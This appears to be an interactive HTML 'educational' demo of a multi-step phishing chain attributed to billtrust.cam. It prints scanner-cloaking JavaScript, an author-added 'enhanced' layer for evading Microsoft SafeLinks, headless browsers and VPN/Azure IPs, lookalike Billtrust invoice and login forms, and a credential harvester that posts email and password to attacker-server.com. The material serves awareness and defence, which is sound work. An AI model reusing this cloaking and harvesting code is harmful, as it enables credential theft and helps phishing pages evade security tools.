<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DEMO: Complete Phishing Flow (Educational)</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-gray-900 text-white">
    <!-- WARNING BANNER -->
    <div class="bg-red-700 text-white p-4 border-b-4 border-red-500 fixed top-0 left-0 right-0 z-50">
        <div class="max-w-6xl mx-auto flex items-center space-x-4">
            <i class="fas fa-exclamation-triangle text-2xl animate-pulse"></i>
            <div class="flex-1">
                <h2 class="text-xl font-bold">‚ö†Ô∏è PHISHING DEMO - EDUCATIONAL ONLY ‚ö†Ô∏è</h2>
                <p class="text-sm">Exact replica of billtrust.cam attack chain. DO NOT use for malicious purposes.</p>
            </div>
            <button onclick="resetDemo()" class="bg-white text-red-700 px-4 py-2 rounded font-bold hover:bg-gray-100">
                Reset Demo
            </button>
        </div>
    </div>

    <div class="pt-24 pb-12 px-4">
        <div class="max-w-6xl mx-auto">
            <!-- Header -->
            <div class="bg-gradient-to-r from-red-900 via-purple-900 to-blue-900 rounded-2xl shadow-2xl p-8 mb-8">
                <div class="text-center">
                    <h1 class="text-4xl font-bold mb-3">
                        üé≠ Complete Phishing Chain Demo
                        <span class="block text-2xl mt-2 text-red-400">
                            üî• Includes EXACT billtrust.cam Detection Code
                        </span>
                    </h1>
                    <p class="text-xl opacity-90 mb-2">Real attack pattern extracted from live phishing site</p>
                    <p class="text-sm opacity-75">3-Step Process: Landing ‚Üí Email Collection ‚Üí Credential Theft</p>
                </div>
            </div>

            <!-- Attack Flow Diagram -->
            <div class="bg-gray-800 rounded-2xl shadow-xl p-8 mb-8">
                <h2 class="text-2xl font-bold mb-6">
                    <i class="fas fa-sitemap text-yellow-400 mr-2"></i>
                    Attack Flow Discovered
                </h2>
                
                <div class="grid md:grid-cols-3 gap-4">
                    <div id="step1" class="bg-gray-900 p-6 rounded-lg border-2 border-green-500 cursor-pointer hover:bg-gray-800 transition" onclick="goToStep(1)">
                        <div class="text-center">
                            <div class="text-4xl mb-3">üåê</div>
                            <h3 class="text-xl font-bold text-green-400 mb-2">Step 1: Landing Page</h3>
                            <p class="text-sm text-gray-400 mb-3">billtrust.cam/</p>
                            <p class="text-xs text-gray-500">Microsoft bots see innocent page</p>
                            <p class="text-xs text-gray-500">Real users ‚Üí redirects to Inv.html</p>
                        </div>
                    </div>
                    
                    <div id="step2" class="bg-gray-900 p-6 rounded-lg border-2 border-gray-600 cursor-pointer hover:bg-gray-800 transition" onclick="goToStep(2)">
                        <div class="text-center">
                            <div class="text-4xl mb-3">üìß</div>
                            <h3 class="text-xl font-bold text-yellow-400 mb-2">Step 2: Email Collection</h3>
                            <p class="text-sm text-gray-400 mb-3">billtrust.cam/Inv.html</p>
                            <p class="text-xs text-gray-500">Fake invoice page</p>
                            <p class="text-xs text-gray-500">Collects victim email</p>
                        </div>
                    </div>
                    
                    <div id="step3" class="bg-gray-900 p-6 rounded-lg border-2 border-gray-600 cursor-pointer hover:bg-gray-800 transition" onclick="goToStep(3)">
                        <div class="text-center">
                            <div class="text-4xl mb-3">üé£</div>
                            <h3 class="text-xl font-bold text-red-400 mb-2">Step 3: Credential Theft</h3>
                            <p class="text-sm text-gray-400 mb-3">Azure Blob Storage</p>
                            <p class="text-xs text-gray-500">invoicedueremotes.z23...</p>
                            <p class="text-xs text-gray-500">Steals login credentials</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Current Step Display -->
            <div id="currentStepContainer">
                <!-- Will be populated by JavaScript -->
            </div>

            <!-- Code Analysis -->
            <div class="bg-gray-800 rounded-2xl shadow-xl p-8 mb-8">
                <h2 class="text-2xl font-bold mb-6">
                    <i class="fas fa-code text-purple-400 mr-2"></i>
                    Code Behind Each Step
                </h2>
                
                <div class="space-y-6">
                    <!-- SPECIAL NOTE: billtrust.cam exact pattern -->
                    <div class="bg-red-900/30 border-2 border-red-500 rounded-lg p-6">
                        <h3 class="text-xl font-bold text-red-400 mb-3">
                            <i class="fas fa-skull-crossbones mr-2"></i>
                            üî• EXACT CODE FROM billtrust.cam PHISHING SITE
                        </h3>
                        <p class="text-gray-300 text-sm mb-3">
                            The code below is the <strong>REAL detection pattern</strong> extracted from the live phishing site billtrust.cam (analyzed February 2026).
                            This is not a theoretical example - this is what attackers are using RIGHT NOW.
                        </p>
                        <div class="bg-black/50 rounded p-4 text-xs">
                            <p class="text-red-400 font-mono mb-2">Extracted from: billtrust.cam (Line 150)</p>
                            <p class="text-green-400 font-mono">Pattern: /bot|google|yandex|baidu|bing|msn|duckduckbot|teoma|slurp|crawler|spider|robot|crawling|facebook/i</p>
                            <p class="text-yellow-400 font-mono">Additional checks: sessionStorage + visibilityState</p>
                        </div>
                    </div>
                    
                    <!-- Step 1 Code -->
                    <div class="bg-gray-900 rounded-lg p-6 border-l-4 border-green-500">
                        <div class="flex items-center justify-between mb-3">
                            <h3 class="text-xl font-bold text-green-400">Step 1: VPN Detection & Redirect</h3>
                            <span class="bg-red-600 text-white text-xs font-bold px-3 py-1 rounded-full animate-pulse">
                                üî• EXACT billtrust.cam CODE
                            </span>
                        </div>
                        <div class="bg-black rounded p-4 mb-3 overflow-x-auto">
                            <pre class="text-green-400 text-sm"><code>// ============================================
// EXACT PATTERN FROM BILLTRUST.CAM (Real Attack)
// ============================================
(function() {
    // EXACT bot detection regex from billtrust.cam:
    // /bot|google|yandex|baidu|bing|msn|duckduckbot|teoma|slurp|
    //  crawler|spider|robot|crawling|facebook/i
    
    if ((/bot|google|yandex|baidu|bing|msn|duckduckbot|teoma|slurp|crawler|spider|robot|crawling|facebook/i.test(navigator.userAgent)) === false 
        && typeof(sessionStorage) != 'undefined' 
        && sessionStorage.getItem('visited') !== 'y' 
        && document.visibilityState) {
        
        // NOT a bot AND first visit AND page visible
        // ‚Üí Show phishing content (hide initially, then fade in)
        
        var style = document.createElement('style');
        style.type = 'text/css';
        style.innerHTML = '@media screen and (min-width: 980px) {' +
            '.t-records {opacity: 0;}' +
            '.t-records_animated {transition: opacity ease-in-out .2s;}' +
            '.t-records.t-records_visible {opacity: 1;}' +
        '}';
        document.getElementsByTagName('head')[0].appendChild(style);
        
        // Fade in phishing content after load
        setTimeout(function() {
            var records = document.querySelectorAll('.t-records');
            records.forEach(function(el) {
                el.classList.add('t-records_animated');
                el.classList.add('t-records_visible');
            });
            sessionStorage.setItem("visited", "y");
        }, 100);
        
        // Redirect to phishing page
        window.location.href = '/Inv.html';
    } else {
        // Bot detected OR already visited OR page hidden
        // ‚Üí Show innocent "Legal Zahirco" page
        console.log('Bot/scanner detected - showing clean content');
    }
})();

// ============================================
// ENHANCED VERSION (Multi-Layer Detection)
// ============================================
async function enhancedDetection() {
    // Layer 1: EXACT billtrust.cam pattern (above)
    
    // Layer 2: Microsoft-specific detection
    const ua = navigator.userAgent.toLowerCase();
    const microsoftBots = ['microsoft', 'office365', 'safelinks', 
                          'outlook', 'defender', 'msnbot', 'bingbot'];
    const isMicrosoftBot = microsoftBots.some(bot => ua.includes(bot));
    
    // Layer 3: Headless browser
    const isHeadless = navigator.webdriver === true || 
                      !navigator.plugins?.length;
    
    // Layer 4: IP detection (VPN/datacenter/Azure)
    let isSuspiciousIP = false;
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        isSuspiciousIP = ['vpn', 'proxy', 'datacenter', 
                         'microsoft', 'azure'].some(
            keyword => data.org.toLowerCase().includes(keyword)
        );
    } catch (e) {
        isSuspiciousIP = true; // Network error = suspicious
    }
    
    // Final decision
    if (isMicrosoftBot || isHeadless || isSuspiciousIP) {
        showInnocentPage();
    } else {
        window.location.href = '/Inv.html';
    }
}</code></pre>
                        </div>
                        <p class="text-gray-400 text-sm">
                            <strong>‚ö° EXACT CODE FROM billtrust.cam:</strong>
                            <br>‚úì Regex pattern: <code class="text-xs">/bot|google|yandex|baidu|bing|msn|duckduckbot|teoma|slurp|crawler|spider|robot|crawling|facebook/i</code>
                            <br>‚úì sessionStorage check: First visit only
                            <br>‚úì document.visibilityState: Page must be visible
                            <br><strong>PLUS Enhanced Detection:</strong>
                            <br>‚úì Microsoft-specific bots (Office365, SafeLinks, Outlook)
                            <br>‚úì Headless browsers (navigator.webdriver)
                            <br>‚úì VPN/proxy/datacenter/Azure IP detection
                            <br>‚Üí <span class="text-yellow-300">Bots see innocent page | Real users redirected to phishing</span>
                        </p>
                    </div>

                    <!-- Step 2 Code -->
                    <div class="bg-gray-900 rounded-lg p-6 border-l-4 border-yellow-500">
                        <h3 class="text-xl font-bold text-yellow-400 mb-3">Step 2: Email Collection Form</h3>
                        <div class="bg-black rounded p-4 mb-3 overflow-x-auto">
                            <pre class="text-green-400 text-sm"><code>// Email collection page (Inv.html)
function collectEmailAndRedirect() {
    const emailInput = document.getElementById('email');
    const email = emailInput.value.trim();
    
    if (!email || !email.includes('@')) {
        alert('Please enter a valid email address');
        return;
    }
    
    // Store email in session
    sessionStorage.setItem('victim_email', email);
    
    // Build final phishing URL with email parameter
    const finalURL = 'https://invoicedueremotes.z23.web.core.windows.net/' +
                     '/?cfg=' + encodeURIComponent(email);
    
    // Redirect to credential theft page
    window.location.href = finalURL;
}

// HTML Form
&lt;form onsubmit="event.preventDefault(); collectEmailAndRedirect();"&gt;
    &lt;input type="email" id="email" placeholder="Enter your email" required&gt;
    &lt;button type="submit"&gt;View Invoice&lt;/button&gt;
&lt;/form&gt;</code></pre>
                        </div>
                        <p class="text-gray-400 text-sm">
                            <strong>How it works:</strong> Fake invoice page asks for email. 
                            Email is passed to Azure blob storage page via URL parameter (?cfg=email)
                        </p>
                    </div>

                    <!-- Step 3 Code -->
                    <div class="bg-gray-900 rounded-lg p-6 border-l-4 border-red-500">
                        <h3 class="text-xl font-bold text-red-400 mb-3">Step 3: Credential Harvesting</h3>
                        <div class="bg-black rounded p-4 mb-3 overflow-x-auto">
                            <pre class="text-green-400 text-sm"><code>// Final phishing page on Azure Blob Storage
function stealCredentials() {
    // Get victim email from URL
    const urlParams = new URLSearchParams(window.location.search);
    const victimEmail = urlParams.get('cfg');
    
    // Pre-fill email field
    document.getElementById('email').value = victimEmail;
    
    // Handle form submission
    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Send stolen credentials to attacker
        await fetch('https://attacker-server.com/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                email: email,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer
            })
        });
        
        // Redirect to real site to avoid suspicion
        window.location.href = 'https://billtrust.com';
    };
}

stealCredentials();</code></pre>
                        </div>
                        <p class="text-gray-400 text-sm">
                            <strong>How it works:</strong> Azure-hosted page shows fake login. 
                            Pre-fills email from URL. Sends credentials to attacker server. Redirects to real site.
                        </p>
                    </div>
                </div>
            </div>

            <!-- Why Each Step Exists -->
            <div class="bg-gray-800 rounded-2xl shadow-xl p-8">
                <h2 class="text-2xl font-bold mb-6">
                    <i class="fas fa-lightbulb text-yellow-400 mr-2"></i>
                    Why This Multi-Step Approach?
                </h2>
                
                <div class="grid md:grid-cols-3 gap-6">
                    <div class="bg-gray-900 p-6 rounded-lg">
                        <h3 class="text-xl font-bold text-green-400 mb-3">
                            <i class="fas fa-shield-alt mr-2"></i>
                            Evade Detection
                        </h3>
                        <ul class="space-y-2 text-sm text-gray-400">
                            <li>‚úì Microsoft SafeLinks blocked (Office365 protection)</li>
                            <li>‚úì Google Safe Browsing can't see phishing page</li>
                            <li>‚úì Headless browser detection (automation tools)</li>
                            <li>‚úì VPN/datacenter/Azure IP filtering</li>
                            <li>‚úì Multi-domain chain harder to trace</li>
                            <li>‚úì Each step looks innocent when scanned alone</li>
                        </ul>
                    </div>
                    
                    <div class="bg-gray-900 p-6 rounded-lg">
                        <h3 class="text-xl font-bold text-yellow-400 mb-3">
                            <i class="fas fa-user-check mr-2"></i>
                            Verify Real Users
                        </h3>
                        <ul class="space-y-2 text-sm text-gray-400">
                            <li>‚úì Email collection proves engagement</li>
                            <li>‚úì Bots won't fill forms</li>
                            <li>‚úì Filters out automated scans</li>
                            <li>‚úì Only committed victims proceed</li>
                        </ul>
                    </div>
                    
                    <div class="bg-gray-900 p-6 rounded-lg">
                        <h3 class="text-xl font-bold text-red-400 mb-3">
                            <i class="fas fa-hourglass-half mr-2"></i>
                            Stay Online Longer
                        </h3>
                        <ul class="space-y-2 text-sm text-gray-400">
                            <li>‚úì Main domain shows clean content</li>
                            <li>‚úì Abuse reports can't reproduce</li>
                            <li>‚úì Azure hosting hard to takedown</li>
                            <li>‚úì Can change final URL easily</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentStep = 1;

        // Step 1: Landing Page (VPN Detection)
        function showStep1() {
            const container = document.getElementById('currentStepContainer');
            container.innerHTML = `
                <div class="bg-gray-800 rounded-2xl shadow-xl p-8 mb-8">
                    <h2 class="text-2xl font-bold mb-6 text-green-400">
                        <i class="fas fa-globe mr-2"></i>
                        Step 1: Landing Page (billtrust.cam/)
                    </h2>
                    
                    <div class="bg-gray-900 rounded-lg p-8 border-2 border-green-500">
                        <div class="text-center mb-6">
                            <i class="fas fa-building text-6xl text-blue-400 mb-4"></i>
                            <h3 class="text-3xl font-bold mb-2">Legal Zahirco</h3>
                            <p class="text-gray-400">Professional Legal Services</p>
                        </div>
                        
                        <div class="bg-yellow-900/30 border-2 border-yellow-500 rounded-lg p-6 mb-6">
                            <h4 class="font-bold text-yellow-400 mb-3">
                                <i class="fas fa-user-secret mr-2"></i>
                                Multi-Layer Security Detection Active
                            </h4>
                            <p class="text-sm text-gray-300 mb-3">
                                Checking for Microsoft bots, security scanners, and automated tools...
                            </p>
                            <div class="space-y-2 text-sm">
                                <div class="flex items-center space-x-2">
                                    <i class="fas fa-spinner fa-spin text-yellow-400"></i>
                                    <span>Scanning User-Agent for Microsoft/Office365/SafeLinks...</span>
                                </div>
                                <div class="flex items-center space-x-2">
                                    <i class="fas fa-spinner fa-spin text-yellow-400"></i>
                                    <span>Detecting headless browsers (navigator.webdriver)...</span>
                                </div>
                                <div class="flex items-center space-x-2">
                                    <i class="fas fa-spinner fa-spin text-yellow-400"></i>
                                    <span>Checking IP geolocation (VPN/Azure/Microsoft ranges)...</span>
                                </div>
                                <div class="flex items-center space-x-2">
                                    <i class="fas fa-spinner fa-spin text-yellow-400"></i>
                                    <span>Analyzing browser fingerprint...</span>
                                </div>
                            </div>
                        </div>
                        
                        <div class="grid md:grid-cols-2 gap-4">
                            <button onclick="simulateVPNUser()" class="bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-6 rounded-lg transition">
                                <i class="fas fa-shield-alt mr-2"></i>
                                Simulate: Microsoft Bot / VPN
                                <p class="text-xs mt-1 opacity-75">Shows innocent page (Office365/SafeLinks behavior)</p>
                            </button>
                            
                            <button onclick="simulateRealUser()" class="bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-6 rounded-lg transition">
                                <i class="fas fa-user mr-2"></i>
                                Simulate: Real Human User
                                <p class="text-xs mt-1 opacity-75">No bot/VPN ‚Üí Redirects to Inv.html</p>
                            </button>
                        </div>
                    </div>
                </div>
            `;
        }

        // Step 2: Email Collection
        function showStep2() {
            const container = document.getElementById('currentStepContainer');
            container.innerHTML = `
                <div class="bg-gray-800 rounded-2xl shadow-xl p-8 mb-8">
                    <h2 class="text-2xl font-bold mb-6 text-yellow-400">
                        <i class="fas fa-file-invoice mr-2"></i>
                        Step 2: Email Collection (billtrust.cam/Inv.html)
                    </h2>
                    
                    <div class="bg-white text-gray-900 rounded-lg p-8 border-4 border-blue-500">
                        <div class="text-center mb-6">
                            <img src="https://www.billtrust.com/wp-content/uploads/2023/03/billtrust-logo-blue.svg" alt="Billtrust" class="h-12 mx-auto mb-4">
                            <h3 class="text-2xl font-bold mb-2">Invoice Payment Required</h3>
                            <p class="text-gray-600">Invoice #INV-2024-00${Math.floor(Math.random() * 9000 + 1000)}</p>
                        </div>
                        
                        <div class="bg-blue-50 border-2 border-blue-300 rounded-lg p-6 mb-6">
                            <div class="flex items-start space-x-3">
                                <i class="fas fa-info-circle text-blue-600 text-2xl mt-1"></i>
                                <div>
                                    <h4 class="font-bold text-blue-900 mb-2">Action Required</h4>
                                    <p class="text-sm text-blue-800">
                                        Your invoice is ready for payment. Please enter your email address to view and pay your invoice.
                                    </p>
                                </div>
                            </div>
                        </div>
                        
                        <form onsubmit="event.preventDefault(); collectEmail();" class="space-y-4">
                            <div>
                                <label class="block text-sm font-bold mb-2">Email Address:</label>
                                <input type="email" id="victimEmail" placeholder="Enter your email" 
                                       class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none"
                                       required>
                            </div>
                            
                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-lg transition">
                                <i class="fas fa-arrow-right mr-2"></i>
                                View Invoice & Pay
                            </button>
                        </form>
                        
                        <p class="text-xs text-gray-500 text-center mt-4">
                            Secure payment powered by Billtrust
                        </p>
                    </div>
                    
                    <div class="mt-6 bg-yellow-900/30 border-2 border-yellow-500 rounded-lg p-4">
                        <p class="text-yellow-300 text-sm">
                            <i class="fas fa-exclamation-triangle mr-2"></i>
                            <strong>What happens:</strong> Email is collected and passed to Azure blob storage via URL parameter
                        </p>
                    </div>
                </div>
            `;
        }

        // Step 3: Credential Theft
        function showStep3(email = 'victim@example.com') {
            const container = document.getElementById('currentStepContainer');
            container.innerHTML = `
                <div class="bg-gray-800 rounded-2xl shadow-xl p-8 mb-8">
                    <h2 class="text-2xl font-bold mb-6 text-red-400">
                        <i class="fas fa-user-lock mr-2"></i>
                        Step 3: Credential Theft (Azure Blob Storage)
                    </h2>
                    
                    <div class="mb-4 bg-blue-900/30 border-2 border-blue-500 rounded-lg p-4">
                        <p class="text-blue-300 text-sm">
                            <i class="fas fa-link mr-2"></i>
                            <strong>Current URL:</strong> <code class="text-xs">https://invoicedueremotes.z23.web.core.windows.net/?cfg=${email}</code>
                        </p>
                    </div>
                    
                    <div class="bg-white text-gray-900 rounded-lg p-8 border-4 border-red-500">
                        <div class="text-center mb-6">
                            <img src="https://www.billtrust.com/wp-content/uploads/2023/03/billtrust-logo-blue.svg" alt="Billtrust" class="h-12 mx-auto mb-4">
                            <h3 class="text-2xl font-bold mb-2">Sign In to View Invoice</h3>
                            <p class="text-gray-600">Invoice #INV-2024-00${Math.floor(Math.random() * 9000 + 1000)}</p>
                        </div>
                        
                        <div class="bg-red-50 border-2 border-red-300 rounded-lg p-4 mb-6">
                            <p class="text-sm text-red-800">
                                <i class="fas fa-lock mr-2"></i>
                                Secure login required to view payment details
                            </p>
                        </div>
                        
                        <form onsubmit="event.preventDefault(); stealCredentials();" class="space-y-4">
                            <div>
                                <label class="block text-sm font-bold mb-2">Email:</label>
                                <input type="email" id="phishEmail" value="${email}" 
                                       class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg bg-gray-100"
                                       readonly>
                            </div>
                            
                            <div>
                                <label class="block text-sm font-bold mb-2">Password:</label>
                                <input type="password" id="phishPassword" placeholder="Enter your password" 
                                       class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none"
                                       required>
                            </div>
                            
                            <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-lg transition">
                                <i class="fas fa-sign-in-alt mr-2"></i>
                                Sign In
                            </button>
                        </form>
                        
                        <div class="mt-4 text-center">
                            <a href="#" class="text-sm text-blue-600 hover:underline">Forgot password?</a>
                        </div>
                    </div>
                    
                    <div class="mt-6 bg-red-900/30 border-2 border-red-500 rounded-lg p-4">
                        <p class="text-red-300 text-sm mb-2">
                            <i class="fas fa-skull-crossbones mr-2"></i>
                            <strong>Final Stage:</strong> Credentials are stolen and sent to attacker
                        </p>
                        <p class="text-red-200 text-xs">
                            Email is pre-filled from URL parameter. Password is captured and sent to attacker's server.
                        </p>
                    </div>
                </div>
            `;
        }

        function goToStep(step) {
            currentStep = step;
            updateStepHighlight();
            
            if (step === 1) showStep1();
            if (step === 2) showStep2();
            if (step === 3) showStep3();
            
            window.scrollTo({ top: 200, behavior: 'smooth' });
        }

        function updateStepHighlight() {
            // Reset all
            ['step1', 'step2', 'step3'].forEach(id => {
                const el = document.getElementById(id);
                el.classList.remove('border-green-500', 'border-yellow-500', 'border-red-500');
                el.classList.add('border-gray-600');
            });
            
            // Highlight current
            const colors = ['', 'border-green-500', 'border-yellow-500', 'border-red-500'];
            document.getElementById(`step${currentStep}`).classList.remove('border-gray-600');
            document.getElementById(`step${currentStep}`).classList.add(colors[currentStep]);
        }

        function simulateVPNUser() {
            alert('‚úÖ Microsoft Bot / VPN / Security Scanner Detected!\n\n' +
                  'Detection Triggers:\n' +
                  '‚Ä¢ User-Agent contains "microsoft", "office365", or "safelinks"\n' +
                  '‚Ä¢ IP from Azure/Microsoft datacenter\n' +
                  '‚Ä¢ Headless browser detected\n' +
                  '‚Ä¢ VPN/Proxy detected\n\n' +
                  'Result: You see the innocent "Legal Zahirco" page.\n\n' +
                  'The phishing page is completely hidden from security tools!');
        }

        function simulateRealUser() {
            alert('üö® Real Human User Detected!\n\n' +
                  'Detection Results:\n' +
                  '‚Ä¢ Normal browser User-Agent\n' +
                  '‚Ä¢ Residential IP (no VPN/proxy)\n' +
                  '‚Ä¢ Real browser with plugins\n' +
                  '‚Ä¢ No automation detected\n\n' +
                  'Result: Redirecting to /Inv.html (phishing page)...');
            setTimeout(() => goToStep(2), 1000);
        }

        function collectEmail() {
            const email = document.getElementById('victimEmail').value;
            if (!email || !email.includes('@')) {
                alert('Please enter a valid email');
                return;
            }
            
            alert(`üìß Email Collected: ${email}\n\nRedirecting to Azure blob storage with ?cfg=${email}`);
            setTimeout(() => {
                showStep3(email);
                goToStep(3);
            }, 1000);
        }

        function stealCredentials() {
            const email = document.getElementById('phishEmail').value;
            const password = document.getElementById('phishPassword').value;
            
            alert(`üö® CREDENTIALS STOLEN!\n\nEmail: ${email}\nPassword: ${password}\n\nIn real attack, these would be sent to attacker's server.\n\nVictim would then be redirected to real billtrust.com`);
            
            // Show completion
            const container = document.getElementById('currentStepContainer');
            container.innerHTML = `
                <div class="bg-red-900 rounded-2xl shadow-xl p-8 mb-8 text-center border-4 border-red-500">
                    <i class="fas fa-check-circle text-6xl text-red-400 mb-4"></i>
                    <h2 class="text-3xl font-bold mb-4">Attack Complete</h2>
                    <p class="text-xl mb-6">All credentials have been "stolen"</p>
                    <div class="bg-black/50 rounded-lg p-6 text-left mb-6">
                        <h3 class="font-bold mb-3">Data Sent to Attacker:</h3>
                        <pre class="text-sm text-green-400">{
  "email": "${email}",
  "password": "${password}",
  "timestamp": "${new Date().toISOString()}",
  "userAgent": "${navigator.userAgent.substring(0, 50)}...",
  "referrer": "billtrust.cam/Inv.html"
}</pre>
                    </div>
                    <p class="text-gray-300 mb-4">
                        Victim would now be redirected to real billtrust.com to avoid suspicion
                    </p>
                    <button onclick="resetDemo()" class="bg-white text-red-900 font-bold px-8 py-3 rounded-lg hover:bg-gray-200 transition">
                        <i class="fas fa-redo mr-2"></i>
                        Start Over
                    </button>
                </div>
            `;
        }

        function resetDemo() {
            currentStep = 1;
            goToStep(1);
            alert('Demo reset! Starting from Step 1...');
        }

        // Initialize
        showStep1();
    </script>
</body>
</html>
